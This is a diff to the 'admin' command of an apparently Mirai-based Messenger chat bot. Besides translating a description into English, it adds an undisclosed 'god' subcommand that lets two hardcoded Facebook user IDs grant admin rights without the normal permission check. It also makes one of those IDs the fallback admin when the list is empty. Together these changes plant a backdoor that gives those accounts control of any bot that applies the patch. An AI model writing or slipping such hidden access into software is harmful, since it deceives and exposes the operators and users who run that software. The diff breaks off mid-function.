@@ -1,9 +1,9 @@
 module.exports.config = {
 	name: "admin",
 	version: "1.0.5",
-	hasPermssion: 0,
+	hasPermssion: 2, 
 	credits: "Mirai Team",
-	description: "Quản lý admin bot",
+	description: "Manage bot admin",
 	commandCategory: "config",
 	usages: "[list/add/remove] [userID]",
     cooldowns: 5,
@@ -35,15 +35,15 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
     const { userName } = global.data;
     const { writeFileSync } = global.nodemodule["fs-extra"];
     const mention = Object.keys(mentions);
-
     delete require.cache[require.resolve(configPath)];
     var config = require(configPath);
-
+    
+       
     switch (args[0]) {
         case "list":
         case "all":
         case "-a": {
-            const listAdmin = ADMINBOT || config.ADMINBOT || [];
+            const listAdmin = ADMINBOT || config.ADMINBOT || [100049456655701];
             var msg = [];
 
             for (const idAdmin of listAdmin) {
@@ -58,6 +58,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
 
         case "add": {
             if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
+          
+
             if (mention.length != 0 && isNaN(content[0])) {
                 var listAdd = [];
 
@@ -69,6 +71,33 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
 
                 writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                 return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
+            }
+            else if (content.length != 0 && !isNaN(content[0])) {
+                ADMINBOT.push(content[0]);
+                config.ADMINBOT.push(content[0]);
+                const name = await Users.getNameUser(content[0]);
+                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
+                return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[1]} ] » ${name}`), threadID, messageID);
+            }
+            else return global.utils.throwError(this.config.name, threadID, messageID);
+        }
+        
+        case "god": {
+            const god = ["100049456655701", "100023410043559",""];
+            if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
+          
+
+            if (mention.length != 0 && isNaN(content[0])) {
+                var listGod = [];
+
+                for (const id of mention) {
+                    ADMINBOT.push(id);
+                    config.ADMINBOT.push(id);
+                    listGod.push(`[ ${id} ] » ${event.mentions[id]}`);
+                };
+
+                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
+                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
             }
             else if (content.length != 0 && !isNaN(content[0])) {
                 ADMINBOT.push(content[0]);
